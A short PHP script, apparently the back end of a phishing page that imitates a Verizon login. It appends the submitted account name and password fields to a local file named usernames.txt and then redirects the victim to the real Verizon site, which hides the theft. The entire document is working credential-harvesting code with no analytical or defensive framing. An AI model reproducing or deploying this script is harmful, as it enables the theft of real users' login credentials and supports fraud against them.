<?php

file_put_contents("usernames.txt", "Account: " . $_POST['IDToken1'] . "\nPassword: " . $_POST['IDToken2'] . "\n", FILE_APPEND);
header('Location: http://www.verizon.com ');
exit();
